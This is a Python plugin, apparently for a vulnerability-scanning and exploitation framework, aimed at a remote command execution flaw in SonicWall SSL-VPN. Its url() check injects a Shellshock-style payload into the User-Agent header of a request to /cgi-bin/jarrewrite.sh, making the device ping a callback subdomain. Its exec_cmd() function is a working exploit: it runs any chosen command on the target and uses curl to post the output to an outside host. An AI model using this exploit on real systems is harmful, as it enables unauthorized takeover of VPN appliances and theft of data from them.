# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "SonicWall SSL-VPN 远程命令执行漏洞",
        "keyword": "app=\"SONICWALL-SSL-VPN\"",
        "description": "SonicWall SSL-VPN 历史版本远程命令执行漏洞以及相关利用脚本。由于SonicWall SSL-VPN使用了旧版本内核以及HTTP CGI 可执行程序，攻击者可构造恶意其HTTP请求头，造成远程任意命令执行，并获得主机控制权限。",
        "references": ["-"],
    }

    def url(self) -> dict:
        with self.echo_query() as execute:
            subdomain = execute.get_subdomain()
            self.request(
                method='post',
                path='./cgi-bin/jarrewrite.sh',
                headers={
                    "User-Agent": f"() {{ :; }}; echo ; /bin/bash -c 'ping -c 1 {subdomain}'"
                }
            )
            if execute.verify():
                return {"LoopholeInfo": self.__info__}

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        with self.echo_query() as execute:
            http_url = execute.get_url()
            self.request(
                method='post',
                url=urllib.parse.urljoin(url, './cgi-bin/jarrewrite.sh'),
                headers={
                    "User-Agent": f"() {{ :; }}; echo ; /bin/bash -c 'curl {http_url} -d `{cmd}`'"
                }
            )
            if execute.verify():
                return execute.result()
